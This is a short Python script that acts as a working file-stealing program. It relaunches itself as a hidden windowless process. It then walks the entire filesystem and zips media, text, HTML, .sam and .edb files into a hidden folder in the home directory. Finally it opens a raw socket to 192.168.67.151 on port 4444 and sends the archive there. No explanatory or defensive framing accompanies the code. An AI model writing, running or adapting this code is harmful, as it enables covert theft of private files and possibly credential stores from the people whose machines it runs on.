import subprocess
import sys
import os
import socket
import zipfile

if __name__ == "__main__":
    # Check if the program is running in a console window
    if sys.stdin.isatty():
        # If running in a console window, re-launch as a background process using pythonw.exe
        subprocess.Popen(["pythonw.exe", __file__], creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        # If already running as a background process, do the program logic here
        root_directory = os.path.abspath('/')
        media_extensions = [".mp3", ".mp4", ".wav", ".avi",".jpg",".jpeg",".text",".txt",".sam",".html",".htm",".edb"]

        # Create a ZipFile object to save the media files to
        zip_file_path = os.path.join(os.path.expanduser("~"), ".hidden", ".media_files.zip")
        if not os.path.exists(os.path.dirname(zip_file_path)):
            os.makedirs(os.path.dirname(zip_file_path))

        with zipfile.ZipFile(zip_file_path, 'w') as zip_file:
            # Walk through every directory and file in the root directory
            for directory_path, directory_names, file_names in os.walk(root_directory):
                # Filter the files by extension
                media_files = [os.path.join(directory_path, file_name) for file_name in file_names if os.path.splitext(file_name)[1] in media_extensions]
                # Add the media files to the zip file
                for media_file in media_files:
                    try:
                        zip_file.write(media_file)
                    except PermissionError:
                        pass
        print(f'Successfully created media file archive at {zip_file_path}')
        ip_address = '192.168.67.151'
        port = 4444

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((ip_address, port))
            with open(zip_file_path, 'rb') as file:
                data = file.read()
                sock.sendall(data)
